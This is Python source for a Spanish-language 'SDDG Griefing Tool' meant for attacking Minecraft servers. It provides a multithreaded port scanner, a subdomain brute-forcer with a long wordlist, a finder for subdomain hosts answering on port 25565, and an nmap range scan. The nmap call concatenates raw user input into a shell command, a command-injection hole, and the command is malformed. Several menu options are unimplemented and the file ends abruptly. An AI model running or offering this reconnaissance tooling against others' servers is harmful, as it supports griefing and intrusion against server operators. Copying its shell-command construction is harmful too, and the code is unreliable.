# -*- coding: utf-8 -*-
import os
import socket
import time
import json
import requests
import sqlmap
import re
import __future__
import requests.exceptions
import sys
import webbrowser
import threading
import colorama
import queue
from urllib.error import URLError
from urllib.parse import urlsplit
import urllib.request
from urllib.request import urlopen
from threading import *
from colorama import *
from queue import *

	#╔═══╗
	#║     ║
	#║     ║
	#╚═══╝
while True:
  os.system("cls || clear")
  os.system("title [SDDG Griefing Tool] MENU")
  print(f"""
  {Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════╗
  {Fore.LIGHTCYAN_EX}║                                          ║                                 
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}   ______{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}      ______   {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} .' ____ \{Fore.LIGHTGREEN_EX} |_   _ `.{Fore.LIGHTRED_EX}|_   _ `.{Fore.LIGHTGREEN_EX}  .' ___  |  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | (___ \_|{Fore.LIGHTGREEN_EX}  | | `. \{Fore.LIGHTRED_EX} | | `. \{Fore.LIGHTGREEN_EX}/ .'   \_|  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  _.____`.{Fore.LIGHTGREEN_EX}   | |  | |{Fore.LIGHTRED_EX} | |  | |{Fore.LIGHTGREEN_EX}| |   ____  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | \____) |{Fore.LIGHTGREEN_EX} _| |_.' /{Fore.LIGHTRED_EX}_| |_.' /{Fore.LIGHTGREEN_EX}\ `.___]  | {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  \______.'{Fore.LIGHTGREEN_EX}|______.'{Fore.LIGHTRED_EX}|______.'{Fore.LIGHTGREEN_EX}  `._____.'  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║                                          ║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}zGhosty    {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}zGhosty#4370      {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}Daiki      {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}Daiki#4677        {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════╝
  """)
  print(f"  {Fore.LIGHTCYAN_EX}╔════════════════════════════════════════════╗")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Port Scanner {Fore.LIGHTCYAN_EX}(Mejorado)            {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Subdomain Search                   {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Dedicados Search                   {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}4{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Range Scan                         {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}5{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Server Status                      {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}6{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Nmap Scan {Fore.LIGHTCYAN_EX}(Mejorado)               {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}7{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Quboscanner Range Scan {Fore.LIGHTCYAN_EX}(Mejorado)  {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}8{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Leave                              {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}9{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Secret Options                     {Fore.LIGHTCYAN_EX}║")
  print(f"  {Fore.LIGHTCYAN_EX}╚════════════════════════════════════════════╝")
  print("\n")
  menu=input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] ")
  
  if menu=="1":
        os.system("cls || clear")
        os.system("title [SDDG Griefing Tool] PORT SCANNER")
        print(f"""
  {Fore.LIGHTCYAN_EX}╔══════════════════════════════════════════╗
  {Fore.LIGHTCYAN_EX}║                                          ║                                 
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}   ______{Fore.LIGHTRED_EX}   ______{Fore.LIGHTGREEN_EX}      ______   {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} .' ____ \{Fore.LIGHTGREEN_EX} |_   _ `.{Fore.LIGHTRED_EX}|_   _ `.{Fore.LIGHTGREEN_EX}  .' ___  |  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | (___ \_|{Fore.LIGHTGREEN_EX}  | | `. \{Fore.LIGHTRED_EX} | | `. \{Fore.LIGHTGREEN_EX}/ .'   \_|  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  _.____`.{Fore.LIGHTGREEN_EX}   | |  | |{Fore.LIGHTRED_EX} | |  | |{Fore.LIGHTGREEN_EX}| |   ____  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX} | \____) |{Fore.LIGHTGREEN_EX} _| |_.' /{Fore.LIGHTRED_EX}_| |_.' /{Fore.LIGHTGREEN_EX}\ `.___]  | {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║{Fore.LIGHTRED_EX}  \______.'{Fore.LIGHTGREEN_EX}|______.'{Fore.LIGHTRED_EX}|______.'{Fore.LIGHTGREEN_EX}  `._____.'  {Fore.LIGHTCYAN_EX}║
  {Fore.LIGHTCYAN_EX}║                                          ║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}zGhosty    {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}zGhosty#4370      {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}║ {Fore.LIGHTGREEN_EX}Dev {Fore.LIGHTRED_EX}Daiki      {Fore.LIGHTWHITE_EX}-       {Fore.LIGHTRED_EX}Daiki#4677        {Fore.LIGHTCYAN_EX}║ 
  {Fore.LIGHTCYAN_EX}╚══════════════════════════════════════════╝
  """)  
        print(f"  {Fore.LIGHTCYAN_EX}╔══════════════════════════════════════╗")
        print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}1{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Escaneo Normal (25400-25900) {Fore.LIGHTCYAN_EX}║")
        print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}2{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Escaneo Rapido (25565-25590) {Fore.LIGHTCYAN_EX}║")
        print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}3{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Escaneo Lento  (1-65535)     {Fore.LIGHTCYAN_EX}║")
        print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}4{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Personalizado                {Fore.LIGHTCYAN_EX}║")
        print(f"  {Fore.LIGHTCYAN_EX}║  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}5{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}Volver                       {Fore.LIGHTCYAN_EX}║")
        print(f"  {Fore.LIGHTCYAN_EX}╚══════════════════════════════════════╝")
        print("\n")
        menu4=input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] ")
        if menu4=="1":
            print_lock = threading.Lock()

            target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}t {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
            port1 = input()
            print("\n")
            def portscan(port):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    con = s.connect((target,port))
                    with print_lock:
                        print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX} {target}",port,' Abierto!')
                    con.close()
                except:
                    pass

            def threader():
                while  True:
                    worker = q.get()
                    portscan(worker)
                    q.task_done()

            q = Queue()

            for x in range(100):
                t = threading.Thread(target=threader)
                t.daemon = True
                t.start()

            for worker in range(25400,25900):
                q.put(worker)

            q.join()
            print("\n")
            input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
        
        elif menu4=="2":
            print_lock = threading.Lock()

            target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}t {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
            print("\n")
            def portscan(port):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    con = s.connect((target,port))
                    with print_lock:
                        print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX} {target}",port,' Abierto!')
                    con.close()
                except:
                    pass

            def threader():
                while  True:
                    worker = q.get()
                    portscan(worker)
                    q.task_done()

            q = Queue()

            for x in range(100):
                t = threading.Thread(target=threader)
                t.daemon = True
                t.start()

            for worker in range(25565,25590):
                q.put(worker)

            q.join()
            print("\n")
            input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
        
        elif menu4=="3":
            print_lock = threading.Lock()

            target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}t {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
            print("\n")
            def portscan(port):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    con = s.connect((target,port))
                    with print_lock:
                        print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX} {target}",port,' Abierto!')
                    con.close()
                except:
                    pass

            def threader():
                while  True:
                    worker = q.get()
                    portscan(worker)
                    q.task_done()

            q = Queue()

            for x in range(100):
                t = threading.Thread(target=threader)
                t.daemon = True
                t.start()

            for worker in range(1,65535):
                q.put(worker)

            q.join()
            print("\n")
            input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
        
        elif menu4=="4":
            print_lock = threading.Lock()

            target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}t {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}IP{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
            port1 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}t {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Puerto Inicial{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
            port2= input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}P{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}t {Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}n{Fore.LIGHTRED_EX}n{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}r{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Puerto Final{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
            
            
            print("\n")
            def portscan(port):
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                try:
                    con = s.connect((target,port))
                    with print_lock:
                        print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX} {target}",port,' Abierto!')
                    con.close()
                except:
                    pass

            def threader():
                while  True:
                    worker = q.get()
                    portscan(worker)
                    q.task_done()

            q = Queue()

            for x in range(100):
                t = threading.Thread(target=threader)
                t.daemon = True
                t.start()

            for worker in range(int(port1),int(port2)):
                q.put(worker)

            q.join()
            print("\n")
            input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
        
        elif menu4=="5":
            print("")

  elif menu=="2":
        os.system("title [SDDG Griefing Tool] SUBDOMAIN SEARCH")
        subdomains0 = ["all", "net", "bypass", "rcon", "node010", "node09", "node08", "node07", "node06", "node05", "node04", "node03", "node02", "node01", "supreme", "subnormal", "fun", "aaa", "aa", "a", "kiwi", "server10", "server09", "server08", "server07", "server06", "server05", "server04", "server03", "server02", "server01", "dev", "recuperar", "dedis", "dedicado", "vote", "events", "www", "ovh-birdmc", "cpanel", "ns-vps", "d", "t", "short", "jar", "iptables", "ufw", "recuperar", "baneados", "imagenes", "samp", "social", "holo", "donaciones", "shoprp", "wow", "multicraft", "mail", "radio3", "radio2", "fr", "teamdub", "serieyt", "shop", "report", "apply", "youtube", "twitter", "st", "lost", "sg", "srvc1", "srvc1", "torneo", "serv11", "serv0", "serv10", "serv9", "serv7", "serv6", "serv5", "serv4", "serv3", "serv2", "serv1", "serv", "mcp", "paysafe", "mu", "radio", "donate", "vps03", "vps02", "vps01", "xenon", "radio", "bans", "ns2", "ns1", "donar", "radio", "new", "appeals", "reports", "translations", "marketing", "staff", "bugs", "help", "render", "foro", "ts3", "git", "analytics", "coins", "votos", "docker-main", "docker", "main", "server3", "cdn", "server2", "creativo", "yt2", "yt", "factions", "solder", "test1", "test001", "testpene", "test", "panel", "apolo", "sv3", "sv2", "sv1", "backups", "zeus", "thor", "vps", "web", "dev", "tv", "deposito", "depositos", "extra", "extras", "bungee1", "torneoyt", "hcf", "uhc5", "uhc4", "uhc3", "uhc2", "uhc1", "uhc", "dedicado5", "dedicado4", "dedicado3", "dedicado2", "ded5", "ded4", "ded3", "ded2", "ded1", "ded", "gamehitodrh", "servidor4", "webmail", "monitor", "servidor001", "servidor10", "servidor9", "servidor8", "servidor7", "servidor6", "servidor5", "servidor4", "servidor3", "hvokfcic7sm", "autodiscover", "tauchet", "hg10", "ping", "hg9", "hg8", "hg7", "hg6", "hg5", "hg4", "hg3", "hg2", "hg1", "tienda", "status", "ayuda", "playstation", "home", "job", "firewall", "rank", "mantenimiento", "beta", "pay", "private", "port", "bb", "stor", "mx5", "serieyt", "shop", "report", "apply", "youtube", "twitter", "st", "lost", "sg", "srvc1", "srvc1", "torneo", "serv11", "serv0", "serv10", "serv9", "serv7", "serv6", "serv5", "serv4", "serv3", "serv2", "serv1", "serv", "mcp", "paysafe", "mu", "radio", "donate", "vps03", "vps02", "vps01", "xenon", "radio", "bans", "ns2", "ns1", "donar", "radio", "new", "translations", "staff", "help", "render", "ts3", "git", "analytics", "coins", "votos", "docker-main", "main", "server3", "server2", "creativo", "yt2", "yt", "factions", "solder", "test1", "test001", "testpene", "test", "panel", "sv3", "sv2", "sv1",  "vps", "build", "web", "dev", "mc", "play", "sys", "node1", "node2", "node3", "node4", "node5", "node6", "node7", "node8", "node9", "node10", "node11", "node12", "node13", "node14", "node15", "node16", "node17", "node18", "node19", "node20", "node001", "node002", "node01", "node02", "node003", "sys001", "sys002", "go", "admin", "eggwars", "bedwars", "lobby1", "hub", "builder", "developer", "test", "test1", "forum", "bans", "baneos", "ts", "ts3", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "server", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeal", "store-assets", "builds", "testing", "server", "pvp", "skywars", "survival", "skyblock", "lobby", "hg", "games", "sys001", "sys002", "node001", "node002", "games001", "games002", "game001", "game002", "game003", "sys001", "us72", "us1", "us2", "us3", "us4", "us5", "goliathdev", "staticassets", "rewards", "rpsrv", "ftp", "ssh", "web", "jobs", "hcf", "grafana", "vote2", "file", "sentry", "enjin", "webserver", "xen", "mco", "monitor", "servidor2", "sadre", "gamehitodrh", "ts"]
        victima0 = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}u{Fore.LIGHTRED_EX}b{Fore.LIGHTGREEN_EX}d{Fore.LIGHTRED_EX}o{Fore.LIGHTGREEN_EX}m{Fore.LIGHTRED_EX}a{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}n {Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}e{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}h{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}DOMAIN{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
        print("\n")
        for ejecutar0 in subdomains0:
            try:
                ipserver0 = str(ejecutar0)+"."+str(victima0)
                iphost0 = socket.gethostbyname(str(ipserver0))
                s = print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}"+str(ejecutar0)+"."+str(victima0)+Fore.LIGHTCYAN_EX+" | "+Fore.LIGHTCYAN_EX+""+str(iphost0))
            except:
                pass
        print("\n")
        input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")
        
  elif menu=="3":
        os.system("title [SDDG Griefing Tool] DEDICADOS SEARCH")
        x = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}e{Fore.LIGHTRED_EX}d{Fore.LIGHTGREEN_EX}i{Fore.LIGHTRED_EX}c{Fore.LIGHTGREEN_EX}ad{Fore.LIGHTGREEN_EX}o{Fore.LIGHTRED_EX}s {Fore.LIGHTGREEN_EX}S{Fore.LIGHTRED_EX}e{Fore.LIGHTGREEN_EX}a{Fore.LIGHTRED_EX}r{Fore.LIGHTGREEN_EX}c{Fore.LIGHTRED_EX}h{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}DOMAIN{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
        print("\n")
        subdomains = ["www", "serieyt", "shop", "report", "apply", "youtube", "twitter", "st", "lost", "sg", "srvc1", "srvc1", "torneo", "serv11", "serv0", "serv10", "serv9", "serv7", "serv6", "serv5", "serv4", "serv3", "serv2", "serv1", "serv", "mcp", "paysafe", "mu", "radio", "donate", "vps03", "vps02", "vps01", "xenon", "radio", "bans", "ns2", "ns1", "donar", "radio", "new", "appeals", "reports", "translations", "marketing", "staff", "bugs", "help", "render", "foro", "ts3", "git", "analytics", "coins", "votos", "docker-main", "main", "server3", "cdn", "server2", "creativo", "yt2", "yt", "factions", "solder", "test1", "test001", "testpene", "test", "panel", "apolo", "sv3", "sv2", "sv1", "backups", "zeus", "thor", "vps", "build", "web", "dev", "staff", "mc", "play", "sys", "node1", "node2", "node3", "node4", "node5", "node6", "node7", "node8", "node9", "node10", "node11", "node12", "node13", "node14", "node15", "node16", "node17", "node18", "node19", "node20", "node001", "node002", "node01", "node02", "node003", "sys001", "sys002", "go", "admin", "eggwars", "bedwars", "lobby1", "hub", "builder", "developer", "test", "test1", "forum", "bans", "baneos", "ts", "ts3", "sys1", "sys2", "mods", "bungee", "bungeecord", "array", "spawn", "server", "help", "client", "api", "smtp", "s1", "s2", "s3", "s4", "server1", "server2", "jugar", "login", "mysql", "phpmyadmin", "demo", "na", "eu", "us", "es", "fr", "it", "ru", "support", "developing", "discord", "backup", "buy", "buycraft", "go", "dedicado1", "dedi", "dedi1", "dedi2", "dedi3", "minecraft", "prueba", "pruebas", "ping", "register", "cdn", "stats", "store", "serie", "buildteam", "info", "host", "jogar", "proxy", "vps", "ovh", "partner", "partners", "appeals", "appeal", "store-assets", "builds", "testing", "server", "pvp", "skywars", "survival", "skyblock", "lobby", "hg", "games", "sys001", "sys002", "node001", "node002", "games001", "games002", "game001", "game002", "game003", "sys001", "us72", "us1", "us2", "us3", "us4", "us5", "goliathdev", "staticassets", "rewards", "rpsrv", "ftp", "ssh", "web", "jobs", "render", "hcf", "grafana", "vote2", "file", "sentry", "enjin", "webserver", "xen", "mco", "monitor", "servidor2", "sadre", "gamehitodrh", "ts"]
        for execute in subdomains:
            try:
                iphost = str(execute)+"."+str(x)
                ipvic = socket.gethostbyname(iphost)
                socka = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                socka.connect((str(ipvic), int(25565)))
                print(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}RESULTADOS{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}| {Fore.LIGHTGREEN_EX}"+ipvic+Fore.LIGHTCYAN_EX+":25565")
            except:
                pass
        print("\n")
        input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}S{Fore.LIGHTGREEN_EX}D{Fore.LIGHTRED_EX}D{Fore.LIGHTGREEN_EX}G{Fore.LIGHTCYAN_EX}] {Fore.LIGHTRED_EX}Presiona {Fore.LIGHTGREEN_EX}Enter {Fore.LIGHTRED_EX}Para {Fore.LIGHTGREEN_EX}Volver {Fore.LIGHTRED_EX}Al {Fore.LIGHTGREEN_EX}Menu ")

     
  elif menu=="4":
        os.system("title [SDDG Griefing Tool] RANGE SCAN")
        target = input(f"  {Fore.LIGHTCYAN_EX}[{Fore.LIGHTRED_EX}Range Scan{Fore.LIGHTCYAN_EX}]--{Fore.LIGHTCYAN_EX}[{Fore.LIGHTGREEN_EX}Range{Fore.LIGHTCYAN_EX}] {Fore.LIGHTCYAN_EX}")
        print("\n")
        os.system("nmap -p 1-20,24-50,100,200,300,400,500,600,700,800,900,777,1000-1010,2000-2020,12345,25500-25600,10001-10020,20001-20020,30000-30005,40001-40010,50001-50010,60001-60010 -T5 -v"+target)
        print("\n")
